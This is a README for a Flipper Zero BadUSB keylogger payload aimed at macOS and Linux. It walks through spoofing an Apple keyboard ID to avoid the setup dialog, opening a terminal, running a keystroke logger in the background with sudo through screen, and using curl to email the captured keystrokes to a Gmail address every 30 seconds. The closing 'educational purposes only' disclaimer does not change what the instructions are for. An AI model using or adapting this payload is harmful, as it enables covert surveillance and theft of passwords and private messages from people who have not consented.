# Keylogger

Here is a macOS/linux payload that will run a keylogger in the background using the `screen` command and sending all keystrokes to the mail's addres yo'll set.


## Instructions:
1. First of all with the ID 05ac:021e Apple:Keyboard line, we are telling to the computer that our Flipper is a "real Apple keyboard" to avoid macOS is displaying the "Keyboard Setup Assistant" dialog and your script is going fuck itself.
2. Press the GUI key and the SPACE key to open the Spotlight search on macOS. This step is optional if you are running the payload on Linux.
3. Type "terminal" to search for the terminal application and press ENTER to open it.
4. Run a command that logs all keystrokes of all applications to a file named keystrokes.txt in the `/tmp` directory of the target device using a kernel extension called `logKext_client`.
5. Use the `screen` command to run the `logKext_client` command in the background with sudo (super user/root) privileges.
6. Use the `while` loop to repeat the following command every 30 seconds (you can edit the time):
7. Use the `curl` command to send an email with all keystrokes logged to the email address of your choice using the SMTP server of Gmail.
8. Exit the terminal window.

## Disclaimer:
Please note that this payload is for educational purposes only and should not be used for illegal activities.